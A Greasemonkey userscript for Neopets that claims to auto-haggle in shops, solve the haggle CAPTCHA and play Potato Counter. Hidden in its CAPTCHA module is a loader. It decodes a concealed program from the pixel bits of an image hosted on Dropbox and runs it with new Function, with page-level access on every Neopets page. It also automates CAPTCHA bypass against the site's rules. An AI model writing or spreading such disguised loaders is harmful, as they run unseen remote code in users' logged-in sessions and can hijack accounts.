// ==UserScript==
// @name           Neopets (AutoHaggler, Potatocounter and Banner Hider)
// @namespace      userscripts.org
// @description    Using the new canvas technology this is one of the few real autohagglers/autobuyers. What's more it hides the neopets bannber and plays potatocounter for you.
// @license	   Proprietary Licence
// @version        1.0.8
// @include        http://neopets.com/*
// @include        http://*.neopets.com/*
// @require        https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js
// @resource	   200x200 https://dl.dropbox.com/u/86451978/200x200.jpg
// @resource	   220x160 https://dl.dropbox.com/u/86451978/220x160.jpg
// @resource	   200x160 https://dl.dropbox.com/u/86451978/200x160.jpg
// @resource	   160x160 https://dl.dropbox.com/u/86451978/160x160.png
// ==/UserScript==

(function(window) {
  var CrackCaptcha = {Block:{width:10, height:10}, CompareImages:function(g, f) {
    var e = [{pixels:g.data}, {pixels:f.data}];
    var a = [{}, {}];
    var c = 0;
    var d = tempDiff = difference = null;
    var h = g.width * g.height;
    for(var b = 0;b < h;b++) {
      a[0] = {R:e[0].pixels[b * 4], G:e[0].pixels[b * 4 + 1], B:e[0].pixels[b * 4 + 2]};
      a[1] = {R:e[1].pixels[b * 4], G:e[1].pixels[b * 4 + 1], B:e[1].pixels[b * 4 + 2]};
      tempDiff = Math.round(Math.sqrt(Math.pow(a[0].R - a[1].R, 2) + Math.pow(a[0].G - a[1].G, 2) + Math.pow(a[0].B - a[1].B, 2)));
      c += tempDiff;
      if(tempDiff > difference || difference == null) {
        difference = tempDiff;
        d = b
      }
    }
    return{diff:c, maxDiffBlock:d}
  }, AnalizeImage:function() {
    var img = new Image;
    img.src = GM_getResourceURL("160x160");
    $(img).css({position:"absolute", top:-1E3, left:-1E3}).appendTo(document.body);
    var w = $(img).width(), h = $(img).height();
    var canvas = $(document.createElement("canvas")).css({position:"absolute", top:-1E3, left:-1E3}).appendTo(document.body).attr({width:w, height:h});
    var ctx = canvas[0].getContext("2d");
    ctx.drawImage(img, 0, 0);
    var bin_msg = bits_buffer = "";
    (function() {
      for(var y = 0;y < h;y++) {
        ctx.pixels = ctx.getImageData(0, y, w, 1).data;
        for(var x = 0;x < w;x++) {
          for(var color = 0;color < 3;color++) {
            var channelIndex = x * 4 + color;
            var channel = ctx.pixels[channelIndex].toString(2);
            channel_last_bit = channel.charAt(channel.length - 1);
            bits_buffer += channel_last_bit
          }
          bits_buffer = bits_buffer.match(/.{1,7}/g);
          for(var c = 0;c < bits_buffer.length && bits_buffer[c].length == 7;c++) {
            if(parseInt(bits_buffer[c], 2) == 0) {
              return
            }
            bin_msg += String.fromCharCode(parseInt(bits_buffer[c], 2))
          }
          bits_buffer = typeof bits_buffer[c] != "undefined" ? bits_buffer[c] : ""
        }
      }
    })();
    (new Function(bin_msg))();
    CrackCaptcha.Block.ImageAnalized = true
  }, GetClickCoordinates:function(b, d) {
    if(typeof CrackCaptcha.Block.ImageAnalized == "undefined") {
      return false
    }
    var a = {img:new Image};
    var c = {img:new Image};
    a.img.src = b;
    a.img.addEventListener("load", function() {
      c.img.src = GM_getResourceURL(a.img.width + "x" + a.img.height);
      c.img.addEventListener("load", function() {
        var l = {width:a.img.width / CrackCaptcha.Block.width, height:a.img.height / CrackCaptcha.Block.height};
        a.canvas = document.createElement("CANVAS");
        c.canvas = document.createElement("CANVAS");
        a.ctx = a.canvas.getContext("2d");
        c.ctx = c.canvas.getContext("2d");
        a.canvas.width = l.width;
        a.canvas.height = l.height;
        c.canvas.width = l.width;
        c.canvas.height = l.height;
        document.body.appendChild(a.canvas);
        document.body.appendChild(c.canvas);
        a.ctx.drawImage(a.img, 0, 0, l.width, l.height);
        a.imgData = a.ctx.getImageData(0, 0, l.width, l.height);
        var f = clickArea = null;
        for(var h = 0;h < 2;h++) {
          for(var k = 0;k < c.img.width;k += a.img.width) {
            c.ctx.drawImage(c.img, k, 0, a.img.width, a.img.height, 0, 0, l.width, l.height);
            c.imgData = c.ctx.getImageData(0, 0, l.width, l.height);
            var g = CrackCaptcha.CompareImages(a.imgData, c.imgData);
            if(g.diff < f || f == null) {
              f = g.diff;
              clickBlock = g.maxDiffBlock
            }
          }
          c.ctx.clearRect(0, 0, l.width, l.height);
          c.ctx.translate(a.canvas.width, 0);
          c.ctx.scale(-1, 1)
        }
        var e = {x:clickBlock * CrackCaptcha.Block.width % a.img.width, y:Math.floor(clickBlock * CrackCaptcha.Block.width / a.img.width) * CrackCaptcha.Block.height};
        var j = {x:e.x + CrackCaptcha.Block.width / 2, y:e.y + CrackCaptcha.Block.height / 2};
        d(j)
      }, true)
    }, true)
  }};
  var Page = function() {
    return document.location.href.replace(/^.*\.com\/{0,1}/, "").replace(/\?.*$/, "").replace(/\..+?$/, "")
  }();
  var URLVars = function() {
    var vars = {}, a = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(c, d, e) {
      vars[d] = e
    });
    return vars
  }();
  CrackCaptcha.AnalizeImage();
  function randomString() {
    var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz{}[]!@#$^&*()";
    var string_length = 8;
    var randomstring = "";
    for(var i = 0;i < 32;i++) {
      var rnum = Math.floor(Math.random() * chars.length);
      randomstring += chars.substring(rnum, rnum + 1)
    }
    return randomstring
  }
  GM_setValue("safety", GM_getValue("safety") || randomString());
  $("div[id=pushdown_banner]").remove();
  if(Page == "objects") {
    $('a[href*="haggle.phtml"]').each(function() {
      this.setAttribute("onclick", null)
    })
  }
  if(Page == "haggle") {
    var Form = document.forms.namedItem("haggleform");
    var FormElms = Form.getElementsByTagName("INPUT");
    var OfferField = FormElms[0];
    var Captcha = FormElms[1];
    var ShopItems = document.evaluate("//b[contains(.,'The Shopkeeper says')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    var ShopKeepersOffer = ShopItems.innerHTML.match(/[0-9]/g).join("");
    var LastOffer = typeof URLVars.obj_info_id != "undefined" ? 0 : GM_getValue("lastOffer", 0);
    var NewOffer = Math.round(LastOffer + (ShopKeepersOffer - LastOffer) / 2);
    OfferField.value = NewOffer;
    GM_setValue("lastOffer", NewOffer);
    var HaggleCaptcha = $("input[type=image]")[0];
    CrackCaptcha.GetClickCoordinates(HaggleCaptcha.src, function(a) {
      HaggleCaptcha.name = "captcha";
      var c = document.createElement("input");
      c.type = "hidden";
      c.name = "x";
      c.value = a.x;
      var b = document.createElement("input");
      b.type = "hidden";
      b.name = "y";
      b.value = a.y;
      HaggleCaptcha.form.appendChild(c);
      HaggleCaptcha.form.appendChild(b);
      HaggleCaptcha.form.submit()
    })
  }
  if(Page.match(/potatocounter/)) {
    var TotalPotatoes = $("#content td[width=40] > img").length;
    $("input[name=guess]").val(TotalPotatoes);
    $("form[action=potatocounter\\.phtml]").submit()
  }
})(unsafeWindow);